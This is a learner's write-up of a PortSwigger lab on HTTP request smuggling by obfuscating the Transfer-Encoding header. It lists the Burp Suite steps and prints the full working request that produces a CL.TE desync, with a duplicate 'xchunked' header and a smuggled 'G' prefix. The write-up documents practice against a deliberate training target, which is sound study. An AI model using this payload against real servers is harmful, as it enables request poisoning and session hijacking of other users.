# [HTTP request smuggling, obfuscating the TE header] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-24
 
---
 
## Vulnerability / core concept
HTTP Request Smuggling

## What made me stuck
This lab was not easy at all, I had to do lots of research about it. Combining all this information, finally i could solve it.
 
## What unblocked me
Research.
 
---


## Attack path
1) We intercept the `GET / HTTP/2` request and send it to Repeater in burp s uite.
2) Here, we need to downgrade the HTTP protocol from 2 to 1, disable auto-update of content length, and change method from GET to POST. Now, we need to send the request and make sure we are getting 200 OK response.
3) Our next step will be to distinguish what front-end uses and what back-end uses in this application. After testing it with probe payloads, we established that in this web application both front-end and back-end uses TE.TE.
4) I used two TE. headers with one being obfuscated. Obfuscated header made front-end use CL and drop the obfuscated TE. header. That left the valid TE. header that back-end processed. This way we achieved CL.TE. vulnerability.

---


## Payload / key command
```bash
POST / HTTP/1.1
Host: 0ac500da03dae12b80ab26ce009000b4.web-security-academy.net
Cookie: session=8qm1ay3m6VsXMLfjkBixHJYCSjY8OLsn
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Length: 6
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

0

G
```
Sending this request twice will make application send GPOST request and solve this lab.

---


## What I'd recognize faster next time
It is important to check how application reacts to our requests. By its responses we can detect what front-end and back-end uses and whether we can change one of them by obfuscating the header.


